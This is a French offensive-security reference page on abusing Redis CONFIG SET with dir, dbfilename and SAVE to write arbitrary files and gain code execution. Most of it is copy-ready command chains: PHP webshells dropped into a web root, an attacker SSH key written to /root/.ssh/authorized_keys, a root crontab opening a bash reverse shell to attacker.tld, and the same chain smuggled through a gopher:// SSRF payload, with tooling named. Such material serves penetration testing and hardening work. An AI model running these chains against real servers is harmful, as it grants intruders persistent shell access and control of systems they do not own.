---
order: 1
title: "Abus de CONFIG SET : écrire des fichiers sur disque pour la RCE"
description: "Relocaliser le fichier de dump Redis avec CONFIG SET dir et dbfilename, puis SAVE, écrit un payload contrôlé sur disque : webshell, authorized_keys ou tâche cron."
keywords:
  - CONFIG SET
  - RCE Redis
  - dbfilename dir
  - écriture de webshell
  - authorized_keys
  - injection de tâche cron
---

# Abus de CONFIG SET

Redis persiste son jeu de données dans un fichier RDB dont le répertoire et le nom de fichier sont configurables à l'exécution. Un attaquant qui peut émettre des commandes (directement, ou smugglées via RESP, voir [Injection de commande](command.md)) peut pointer ce fichier vers n'importe quel emplacement où le processus Redis peut écrire, bourrer une clé avec un payload choisi et déclencher un dump. Le résultat est une écriture de fichier arbitraire, qui se convertit en exécution de code via plusieurs cibles éprouvées.

## La chaîne principale

Quatre étapes : relocaliser le répertoire de dump, nommer le fichier de dump, stocker le payload en tant que clé et flusher sur disque. Sur Redis 7.0 et ultérieur, `dir` et `dbfilename` sont des paramètres de configuration protégés : leur `CONFIG SET` est refusé sauf si le serveur a été démarré avec `enable-protected-configs yes`. La chaîne s'applique aux Redis plus anciens, ou aux 7.x où les configs protégées ont été activées.

```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "\n\n<?php system($_GET['c']); ?>\n\n"
SAVE
```

`CONFIG SET dir` définit le répertoire de travail ; `CONFIG SET dbfilename` définit le nom de fichier de sortie ; `SET` place le payload dans une clé ; `SAVE` (synchrone) ou `BGSAVE` (en arrière-plan) écrit le fichier RDB vers `dir/dbfilename`. Le format RDB enveloppe le payload dans des octets d'en-tête et de pied binaires, mais ces octets sont inertes pour un interpréteur PHP, un lecteur de clé SSH ou cron, de sorte que le contenu embarqué s'exécute tout de même. Les sauts de ligne de tête et de queue autour du payload le maintiennent sur ses propres lignes, à l'écart du cadre binaire.

Confirmez d'abord le répertoire inscriptible avec `CONFIG GET dir`, et lisez le nom de fichier courant avec `CONFIG GET dbfilename` afin de pouvoir le restaurer et éviter de perturber la cible.

## Cible 1 : webshell

Lorsque Redis partage un hôte avec un serveur web et que la racine du document est inscriptible par l'utilisateur Redis, la chaîne ci-dessus dépose un script exécutable dans la racine web :

```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename x.php
SET sh "\n<?php echo shell_exec($_REQUEST['cmd']); ?>\n"
BGSAVE
```

Puis demandez `http://target.tld/x.php?cmd=id`.

## Cible 2 : SSH authorized_keys

Lorsque Redis s'exécute sous un utilisateur disposant d'un répertoire personnel, écrivez une clé publique d'attaquant dans `~/.ssh/authorized_keys` :

```
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET k "\n\nssh-rsa AAAAB3NzaC1yc2E... attacker@host\n\n"
SAVE
```

SSH ignore les octets RDB environnants comme des lignes malformées et accepte la ligne `ssh-rsa` valide, accordant une connexion par clé en tant que cet utilisateur.

## Cible 3 : tâche cron

Sur les systèmes dont cron lit des fichiers drop-in, écrivez une crontab qui lance un reverse shell :

```
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SET job "\n\n* * * * * bash -i >& /dev/tcp/attacker.tld/4444 0>&1\n\n"
SAVE
```

Le chemin et le format varient selon la distribution. `/var/spool/cron/crontabs/<user>` sur les systèmes de la famille Debian et `/var/spool/cron/<user>` sur ceux de la famille Red Hat sont des crontabs par utilisateur et ne prennent pas de champ de nom d'utilisateur (la planification est directement suivie de la commande, comme ci-dessus). Les drop-ins système sous `/etc/cron.d/<name>` exigent quant à eux un champ de nom d'utilisateur (`* * * * * root bash ...`). cron tolère les lignes binaires malformées et exécute la ligne de planification valide.

## Séquence smugglée complète

Chaînée via un payload SSRF `gopher://`, chaque commande séparée par `\r\n` :

```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "\n<?php system($_GET['c']);?>\n"
SAVE
```

## Outils

- **redis-cli** : exécuter la chaîne d'écriture sur disque CONFIG SET, SET et SAVE.
- **Gopherus** : construire le payload gopher:// qui fait passer la chaîne via SSRF.
- **Burp Repeater** : livrer l'URL SSRF portant la chaîne.

## Références

- [Redis : CONFIG SET](https://redis.io/docs/latest/commands/config-set/)
- [Redis : persistence and RDB](https://redis.io/docs/latest/operate/oss_and_stack/management/persistence/)
- [PayloadsAllTheThings : Redis RCE via file write](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
